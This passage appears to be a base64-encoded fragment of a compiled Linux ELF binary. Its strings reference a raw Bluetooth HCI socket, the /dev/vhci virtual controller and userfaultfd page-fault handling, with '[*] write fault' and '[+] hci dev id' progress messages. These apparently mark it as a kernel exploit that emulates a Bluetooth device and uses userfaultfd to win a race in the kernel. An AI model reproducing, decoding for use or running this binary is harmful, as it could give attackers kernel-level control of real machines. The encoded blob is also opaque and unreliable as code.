AAAAAL8AAAASAAAAAAAAAAAAAAAAAAAAAAAAAF0AAAASAAAAAAAAAAAAAAAA
AAAAAAAAAEwAAAASAAAAAAAAAAAAAAAAAAAAAAAAABEAAAAgAAAAAAAAAAAA
AAAAAAAAAAAAANoAAAASAAAAAAAAAAAAAAAAAAAAAAAAAKkAAAASAAAAAAAA
AAAAAAAAAAAAAAAAAAcBAAASAAAAAAAAAAAAAAAAAAAAAAAAAK4AAAASAAAA
AAAAAAAAAAAAAAAAAAAAAM4AAAASAAAAAAAAAAAAAAAAAAAAAAAAAMcAAAAS
AAAAAAAAAAAAAAAAAAAAAAAAANMAAAASAAAAAAAAAAAAAAAAAAAAAAAAAPkA
AAASAAAAAAAAAAAAAAAAAAAAAAAAAIYAAAASAAAAAAAAAAAAAAAAAAAAAAAA
AEcAAAASAAAAAAAAAAAAAAAAAAAAAAAAACQBAAASAAAAAAAAAAAAAAAAAAAA
AAAAABwBAAASAAAAAAAAAAAAAAAAAAAAAAAAAF8BAAAgAAAAAAAAAAAAAAAA
AAAAAAAAAOsAAAASAAAAAAAAAAAAAAAAAAAAAAAAAOYAAAASAAAAAAAAAAAA
AAAAAAAAAAAAAOEAAAASAAAAAAAAAAAAAAAAAAAAAAAAAIEAAAASAAAAAAAA
AAAAAAAAAAAAAAAAAKIAAAASAAAAAAAAAAAAAAAAAAAAAAAAADYBAAASAAAA
AAAAAAAAAAAAAAAAAAAAAGwAAAASAAAAAAAAAAAAAAAAAAAAAAAAAJ0AAAAS
AAAAAAAAAAAAAAAAAAAAAAAAAHkAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAYB
AAASAAAAAAAAAAAAAAAAAAAAAAAAAC0AAAAgAAAAAAAAAAAAAAAAAAAAAAAA
AA0BAAAiAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAASAAAAAAAAAAAAAAAAAAAA
AAAAAJYAAAASAAAAAAAAAAAAAAAAAAAAAAAAAPIAAAARABgAIDAgAAAAAAAI
AAAAAAAAAABsaWJwdGhyZWFkLnNvLjAAX0lUTV9kZXJlZ2lzdGVyVE1DbG9u
ZVRhYmxlAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAcmVhZABfX2Vycm5v
X2xvY2F0aW9uAHB0aHJlYWRfY3JlYXRlAHB0aHJlYWRfam9pbgBjb25uZWN0
AG9wZW4AY2xvc2UAbGliYy5zby42AHNvY2tldABleGl0AHBlcnJvcgBwdXRz
AF9fc3RhY2tfY2hrX2ZhaWwAcHV0Y2hhcgBwcmludGYAbW1hcABtZW1zZXQA
d3JpdGV2AGJpbmQAcG9sbABtZW1jcHkAc3RkZXJyAGlvY3RsAHVzbGVlcABm
d3JpdGUAX19jeGFfZmluYWxpemUAc3lzY2FsbABfX2xpYmNfc3RhcnRfbWFp
bgBzeXNjb25mAEdMSUJDXzIuMi41AEdMSUJDXzIuMTQAR0xJQkNfMi40AF9f
Z21vbl9zdGFydF9fAAAAAgADAAMAAAACAAIAAwAEAAIAAgACAAIAAwADAAIA
AgAAAAUAAgACAAMAAgACAAMAAgADAAIAAAACAAIAAgACAAEAAQABAAAAEAAA
ACAAAAB1GmkJAAADAD4BAAAAAAAAAQADAIwAAAAQAAAAAAAAAJSRlgYAAAUA
SgEAABAAAAAUaWkNAAAEAFUBAAAQAAAAdRppCQAAAgA+AQAAAAAAAOAsIAAA
AAAACAAAAAAAAAAQDgAAAAAAAOgsIAAAAAAACAAAAAAAAADQDQAAAAAAAAgw
IAAAAAAACAAAAAAAAAAIMCAAAAAAANgvIAAAAAAABgAAAAQAAAAAAAAAAAAA
AOAvIAAAAAAABgAAAA8AAAAAAAAAAAAAAOgvIAAAAAAABgAAABEAAAAAAAAA
AAAAAPAvIAAAAAAABgAAABwAAAAAAAAAAAAAAPgvIAAAAAAABgAAAB0AAAAA
AAAAAAAAACAwIAAAAAAABQAAACAAAAAAAAAAAAAAAAgvIAAAAAAABwAAAAEA
AAAAAAAAAAAAABAvIAAAAAAABwAAAAIAAAAAAAAAAAAAABgvIAAAAAAABwAA
AAMAAAAAAAAAAAAAACAvIAAAAAAABwAAAAUAAAAAAAAAAAAAACgvIAAAAAAA
BwAAAAYAAAAAAAAAAAAAADAvIAAAAAAABwAAAAcAAAAAAAAAAAAAADgvIAAA
AAAABwAAAAgAAAAAAAAAAAAAAEAvIAAAAAAABwAAAAkAAAAAAAAAAAAAAEgv
IAAAAAAABwAAAAoAAAAAAAAAAAAAAFAvIAAAAAAABwAAAAsAAAAAAAAAAAAA
AFgvIAAAAAAABwAAAAwAAAAAAAAAAAAAAGAvIAAAAAAABwAAAA0AAAAAAAAA
AAAAAGgvIAAAAAAABwAAAA4AAAAAAAAAAAAAAHAvIAAAAAAABwAAABAAAAAA
AAAAAAAAAHgvIAAAAAAABwAAABIAAAAAAAAAAAAAAIAvIAAAAAAABwAAABMA
AAAAAAAAAAAAAIgvIAAAAAAABwAAABQAAAAAAAAAAAAAAJAvIAAAAAAABwAA
ABUAAAAAAAAAAAAAAJgvIAAAAAAABwAAABYAAAAAAAAAAAAAAKAvIAAAAAAA
BwAAABcAAAAAAAAAAAAAAKgvIAAAAAAABwAAABgAAAAAAAAAAAAAALAvIAAA
AAAABwAAABkAAAAAAAAAAAAAALgvIAAAAAAABwAAABoAAAAAAAAAAAAAAMAv
IAAAAAAABwAAABsAAAAAAAAAAAAAAMgvIAAAAAAABwAAAB4AAAAAAAAAAAAA
ANAvIAAAAAAABwAAAB8AAAAAAAAAAAAAAEiD7AhIiwWtJCAASIXAdAL/0EiD
xAjDAAAAAAAAAAAA/zWiIyAA/yWkIyAADx9AAP8loiMgAGgAAAAA6eD/////
JZojIABoAQAAAOnQ/////yWSIyAAaAIAAADpwP////8liiMgAGgDAAAA6bD/
////JYIjIABoBAAAAOmg/////yV6IyAAaAUAAADpkP////8lciMgAGgGAAAA
6YD/////JWojIABoBwAAAOlw/////yViIyAAaAgAAADpYP////8lWiMgAGgJ
AAAA6VD/////JVIjIABoCgAAAOlA/////yVKIyAAaAsAAADpMP////8lQiMg
AGgMAAAA6SD/////JTojIABoDQAAAOkQ/////yUyIyAAaA4AAADpAP////8l
KiMgAGgPAAAA6fD+////JSIjIABoEAAAAOng/v///yUaIyAAaBEAAADp0P7/
//8lEiMgAGgSAAAA6cD+////JQojIABoEwAAAOmw/v///yUCIyAAaBQAAADp
oP7///8l+iIgAGgVAAAA6ZD+////JfIiIABoFgAAAOmA/v///yXqIiAAaBcA
AADpcP7///8l4iIgAGgYAAAA6WD+////JdoiIABoGQAAAOlQ/v///yXyIiAA
ZpAAAAAAAAAAADHtSYnRXkiJ4kiD5PBQVEyNBSoYAABIjQ2zFwAASI093w0A
AP8VpiIgAPQPH0QAAEiNPckiIABVSI0FwSIgAEg5+EiJ5XQZSIsFeiIgAEiF
wHQNXf/gZi4PH4QAAAAAAF3DDx9AAGYuDx+EAAAAAABIjT2JIiAASI01giIg
AFVIKf5IieVIwf4DSInwSMHoP0gBxkjR/nQYSIsFQSIgAEiFwHQMXf/gZg8f
hAAAAAAAXcMPH0AAZi4PH4QAAAAAAIA9USIgAAB1L0iDPRciIAAAVUiJ5XQM
SIs9GiIgAOgN////6Ej////GBSkiIAABXcMPH4AAAAAA88NmDx9EAABVSInl
Xelm////VUiJ5UiD7CBIiX3oiXXkSI09OBcAAOhr/f//x0X8EAAAAMdF9AAA
AADrXMdF+AAAAADrM4tF9I1QAYlV9Ehj0EiLRehIAdAPtgAPvsAPtsCJxkiN
PSkXAAC4AAAAAOhj/f//g0X4AYtF+DtF/H0Ii0X4O0XkfL2/CgAAAOjF/P//
i0X8KUXkg33kAH+evwoAAADor/z//5DJw1VIieVIg+wgSIl96Il15EiLRehI
g8ABSIlF+EiLRfgPtwAPt8CJxkiNPcAWAAC4AAAAAOj0/P//i1XkSItF6InW
SInH6B3///+QycNVSInlSIPsIIl9/EiJdfBIiVXoSItV6EiLTfCLRfxIic6J
x+iI/P//SIXAeRZIjT2JFgAA6Ef9//+//////+ht/f//kMnDVUiJ5UiB7MAE
AACJvVz7//9IibVQ+///SImVSPv//2RIiwQlKAAAAEiJRfgxwEiLhVD7//9I
iYVo+///SIO9SPv//wJ+HkiLhWj7//8PtkACD7bASIuVSPv//0iD6gNIOdB0
FkiNPRoWAADoyvz//7//////6PD8//9IjZXw+///uAAAAAC5gAAAAEiJ1/NI
q0iLhWj7//8PtwAPt8AtBQQAAIP4Iw+HowYAAInASI0UhQAAAABIjQXpFQAA
iwQCSGPQSI0F3BUAAEgB0P/gxoXw+///BEiNhfD7//9Ig8ABSImF0Pv//0iL
hdD7///GAA9Ii4XQ+///xkABBEiNhfD7//9Ig8ADSImF2Pv//0iLhdj7///G
QAEBSIuF2Pv//2bHQAIFBEiLhdj7///GAABIjY3w+///i4Vc+///ugcAAABI
ic6Jx+ht/v//SI2F8Pv//7oABAAAvgAAAABIicfoRPv//8aF8Pv//wRIjYXw
+///SIPAAUiJheD7//9Ii4Xg+///xgADSIuF4Pv//8ZAAQtIjYXw+///SIPA
A0iJhej7//9Ii4Xo+///xgAASIuF6Pv//2bHQAFKAEiLhej7///GQAkBSIuF
6Pv//8ZACgBIi4Xo+///SIPAA7oGAAAAvrsAAABIicfouvr//0iNjfD7//+L
hVz7//+6DgAAAEiJzonH6K79//+4AAAAAOlKBQAAxoXw+///BEiNhfD7//9I
g8ABSImFoPv//0iLhaD7///GAA9Ii4Wg+///xkABBEiNhfD7//9Ig8ADSImF
qPv//0iLhaj7///GQAEBSIuFqPv//2bHQAIbBEiLhaj7///GAABIjY3w+///
i4Vc+///ugcAAABIic6Jx+gm/f//SI2F8Pv//7oABAAAvgAAAABIicfo/fn/
/8aF8Pv//wRIjYXw+///SIPAAUiJhaD7//9Ii4Wg+///xgALSIuFoPv//8ZA
AQtIjYXw+///SIPAA0iJhbD7//9Ii4Ww+///xgAASIuFsPv//2bHQAFKAEiN
BYgTAACJwUiLhbD7//9Ig8ADuggAAACJzkiJx+iD+f//SI2N8Pv//4uFXPv/
/7oOAAAASInOicfod/z//7gAAAAA6RMEAADGhfD7//8ESI2F8Pv//0iDwAFI
iYVw+///SIuFcPv//8YAD0iLhXD7///GQAEESI2F8Pv//0iDwANIiYV4+///
SIuFePv//8ZAAQFIi4V4+///ZsdAAigESIuFePv//8YAAEiNjfD7//+LhVz7
//+6BwAAAEiJzonH6O/7//9IjYXw+///ugAEAAC+AAAAAEiJx+jG+P//xoXw
+///BEiNhfD7//9Ig8ABSImFcPv//0iLhXD7///GACxIi4Vw+///xkABEUiN
hfD7//9Ig8ADSImFgPv//0iLhYD7///GAABIi4WA+///ZsdAAUsASIuFgPv/
/8ZAEAFIi4WA+///xkAJAkiLhYD7///GQAsASIuFgPv//8ZACgBIi4WA+///
ZsdADgAASIuFgPv//2bHQAwAAEiLhYD7//9Ig8ADugYAAAC+uwAAAEiJx+gM
+P//SI2N8Pv//4uFXPv//7oUAAAASInOicfoAPv//7gAAAAA6ZwCAADGhfD7
//8ESI2F8Pv//0iDwAFIiYWI+///SIuFiPv//8YAD0iLhYj7///GQAEESI2F
8Pv//0iDwANIiYWQ+///SIuFkPv//8ZAAQFIi4WQ+///ZsdAAhwESIuFkPv/
/8YAAEiNjfD7//+LhVz7//+6BwAAAEiJzonH6Hj6//9IjYXw+///ugAEAAC+
AAAAAEiJx+hP9///xoXw+///BEiNhfD7//9Ig8ABSImFiPv//0iLhYj7///G
ACNIi4WI+///xkABDUiNhfD7//9Ig8ADSImFmPv//0iLhZj7///GAABIi4WY
+///ZsdAAUoASIuFmPv//8ZABAFIi4WY+///xkADAUiLhZj7//9Ig8AFuggA
AAC+AAAAAEiJx+jF9v//SI2N8Pv//4uFXPv//7oQAAAASInOicfoufn//7gA
AAAA6VUBAADGhfD7//8ESI2F8Pv//0iDwAFIiYW4+///SIuFuPv//8YAD0iL
hbj7///GQAEESI2F8Pv//0iDwANIiYXA+///SIuFwPv//8ZAAQFIi4XA+///
ZsdAAhkESIuFwPv//8YAAEiNjfD7//+LhVz7//+6BwAAAEiJzonH6DH5//9I
jYXw+///ugAEAAC+AAAAAEiJx+gI9v//xoXw+///BEiNhfD7//9Ig8ABSImF
uPv//0iLhbj7///GAAdIi4W4+///xkAB/0iNhfD7//9Ig8ADSImFyPv//0iL
hcj7///GAABIi4XI+///SIPAAboGAAAAvrsAAABIicfoofX//0iNBYwPAACJ
wUiLhcj7//9Ig8AHugMAAACJzkiJx+h+9f//SI2N8Pv//4uFXPv//7oCAQAA
SInOicfocvj//7gAAAAA6xFIjT1KDwAA6P/0//+4AAAAAEiLdfhkSDM0JSgA
AAB0BegG9f//ycNVSInlSIHsMAQAAEiJvdj7//9kSIsEJSgAAABIiUX4McBI
jZXw+///uAAAAAC5gAAAAEiJ1/NIq4sFjhkgAEiNjfD7//+6AAQAAEiJzonH
6BD1//9IiYXo+///SIO96Pv//wB5FkiNPVQPAADoU/X//7//////6Hn1//9I
g73o+///AH5YD7aF8Pv//zwBdU1Ii4Xo+///icJIjYXw+///idZIicfoTvf/
/0iLhej7//9IjVD/SI2F8Pv//0iDwAGLDQYZIABIicaJz+i69///hMAPhIMA
AADpgwAAAEiDvej7//8AficPtoXw+///PAJ1HEiLhej7//+JwkiNhfD7//+J
1kiJx+hS9v//61JIg73o+///AA+OBf///w+2hfD7//88Aw+F9v7//0iLhej7
//+JwkiNhfD7//+J1kiJx+gZ9v//SI09fQ4AAOhz9P//v//////omfT//+nB
/v//kEiLdfhkSDM0JSgAAAB0BeiP8///ycNVSInlSIPscEiJfZhkSIsEJSgA
AABIiUX4McBIi0WYSIlFqEiLBesXIABIhcB1VYsF2BcgAEiYQbkAAAAAQbj/
////uSIAAAC6AwAAAEiJxr8AAAAA6EPz//9IiQW0FyAASIsFrRcgAEiD+P91
FkiNPfsNAADo0/P//7//////6Pnz//9Ii0WoiUW4ZsdFvAEASI1FuLr/////
vgEAAABIicfodvP//4lFpIN9pP91FkiNPb4NAADokfP//7//////6Lfz//9I
i0WouiAAAABIjTVXFyAAicfoEPP//0iJRbBIg32wAHUWSI09iw0AAOh58v//
vwEAAADof/P//0iDfbD/dRZIjT2CDQAA6Dzz//+//////+hi8///D7YFCxcg
ADwSdCpIiwXAFiAASInBuiAAAAC+AQAAAEiNPVQNAADoV/P//78BAAAA6C3z
//9IiwXeFiAAg+ABSIXAD4SmAAAASI09TA0AAOj+8f//SIsVxxYgAIsFkRYg
APfYSJhIIdBIiUXAiwWAFiAASJhIiUXISItFqInBSI1FwEiJwr4BqhCAic+4
AAAAAOgc8v//g/j/dRZIjT0JDQAA6Ivy//+//////+ix8v//SItFqInBSI1F
wEiJwr4CqhCAic+4AAAAAOjj8f//g/j/D4WR/v//SI095AwAAOhO8v//v///
///odPL//0iNPeAMAADoWPH//4sFOhYgAInH6Lvx//+/9AEAAOiB8v//SIsF
4hUgAEjHAAAAAABIiwXUFSAAugwAAABIjTWyDAAASInH6Ljx//+LBfIVIACD
wAGJBekVIABIiwWqFSAASIlF2EiLFccVIACLBZEVIAD32EiYSCHQSIlF0IsF
gBUgAEiYSIlF4EjHRegAAAAASMdF8AAAAABIi0WoicFIjUXQSInCvgOqKMCJ
z7gAAAAA6Azx//+D+P8Phbr9//9IjT07DAAA6Hfx//+//////+id8f//VUiJ
5UiB7LAAAACJvVz///9IibVQ////ZEiLBCUoAAAASIlF+DHAuAAAAADosQcA
AEiJBT0VIACLBT8VIACD4AAJ0IkFNBUgALoCAAAAvgUAAAC/HwAAAOiA8f//
iYVs////SMdF6AAAAABmx0XoHwBIjUXoSIPAAroGAAAAvqoAAABIicfoUvD/
/0iNTeiLhWz///+6CAAAAEiJzonH6Knw//+FwHkWSI09jwsAAOi58P//v///
///o3/D//0iNhXj///+5AAAAAEiNFdj6//++AAAAAEiJx+h/7///SMdF8AAA
AABmx0XwHwBIjUXwSIPAAroGAAAAvrsAAABIicfo1+///0iNTfCLhWz///+6
CAAAAEiJzonH6I7w//+JhXD///+DvXD///8AdBZIjT0OCwAA6DPw//+/////
/+hZ8P//SIuFeP///74AAAAASInH6DXw//+/HgAAAOgb8P//iQXFEyAAiwW/
EyAASJhIiUWIvgAICAC/QwEAALgAAAAA6JXv//9IiUWQSIN9kP91FkiNPbEK
AADozu///7//////6PTv//9Ix0WgqgAAAEjHRagAAAAASItFkInBSI1FoEiJ
wr4/qhjAic+4AAAAAOgW7///g/j/dRZIjT10CgAA6IXv//+//////+ir7///
SItFiEG5AAAAAEG4/////7kiAAAAugMAAABIica/AAAAAOik7v//SIlFmEiD
fZj/dRZIjT1lCQAA6D3v//+//////+hj7///SItFmEiJRcBIi0WISIlFyEjH
RdABAAAASItFkInBSI1FwEiJwr4AqiDAic+4AAAAAOh97v//g/j/dRZIjT3s
CQAA6Ozu//+//////+gS7///SItVkEiNRYBIidFIjRWD+v//vgAAAABIicfo
s+3//4mFdP///4O9dP///wB0Juiv7f//SInCi4V0////iQJIjT2uCQAA6Jju
//+//////+i+7v//SItNmIuFbP///7oQAAAASInOicfope3//+v+VUiJ5UiD
xICJfZyJ8EiJVZBIiU2IZolFmGRIiwQlKAAAAEiJRfgxwMZFqw5Ii0WIg8AD
iEWsxkWtAQ+3RZhmiUWuxkWqBEiNRapIiUWwSMdFuAEAAABIjUWrSIlFwEjH
RcgCAAAASI1FrUiJRdBIx0XYAwAAAEiLRZBIiUXgSItFiEiJRehIjU2wi0Wc
ugQAAABIic6Jx+jn7P//SIXAeRZIjT3rCAAA6Mbt//+/AQAAAOjs7f//kEiL
RfhkSDMEJSgAAAB0Bejn7P//ycNVSInlSIPscIl9rInwSIlVoEiJTZiIRahk
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
qfD//6nw//+p8P//qfD//6nw//+p8P//qfD//6nw//+p8P//qfD//6nw//+p
8P//qfD//6nw//+p8P//qfD//2Xv//+p8P//cOv//x7u//+p8P//qfD//6nw
//+p8P//qfD//6nw//+p8P//qfD//6nw//+p8P//qfD//6fs//9yZWFkIGJ1
ZgBtaXNzIGhhbmRsZWQgU0NPIGRhdGEgcGFja2V0CgBtbWFwAHBvbGwARU9G
IG9uIHVzZXJmYXVsdGZkIQByZWFkAAAAVW5leHBlY3RlZCBldmVudCBvbiB1
c2VyZmF1bHRmZAoAWypdIHdyaXRlIGZhdWx0AGlvY3RsLVVGRkRJT19VTlJF
R0lTVEVSAGlvY3RsLVVGRkRJT19XQUtFAFsqXSByZWFkIGZhdWx0AEhlbGxv
IFdvcmxkIQBpb2N0bC1VRkZESU9fQ09QWQBiaW5kAGNvbm5lY3QAdXNlcmZh
dWx0ZmQAaW9jdGwtVUZGRElPX0FQSQBpb2N0bC1VRkZESU9fUkVHSVNURVIA
cHRocmVhZF9jcmVhdGUAd3JpdGV2IGZhaWxlZAAAAHByb2Nlc3NfY29tbWFu
ZF9wa3Q6IGludmFsaWQgc2l6ZQByZWFkIGZhaWxlZAAAAHNvY2tldChBRl9C
TFVFVE9PVEgsIFNPQ0tfUkFXLCBCVFBST1RPX0hDSSkgZmFpbGVkAC9kZXYv
dmhjaQBvcGVuIC9kZXYvdmhjaSBmYWlsZWQAd3JvbmcgcmVzcG9uc2UgcGFj
a2V0AFsrXSBoY2kgZGV2IGlkOiAleAoAcHRocmVhZF9jcmVhdGUgZmFpbGVk
AGlvY3RsKEhDSURFVlVQKSBmYWlsZWQAWytdIGRldmljZSBoY2ktJWQgaW5p
dCBkb25lCgAAARsDO5QAAAARAAAAqOL//+AAAABY5P//CAEAAGjk//+wAAAA
cuX//yABAAAM5v//QAEAAFjm//9gAQAAnub//4ABAAAU7v//oAEAAIvv///A
AQAAa/L//9wBAABl9f//+AEAADP2//8YAgAA5Pb//zgCAABl+f//WAIAAE36
//94AgAAOPz//5gCAACo/P//4AIAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwH
CJABBxAUAAAAHAAAALDj//8rAAAAAAAAAAAAAAAUAAAAAAAAAAF6UgABeBAB
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
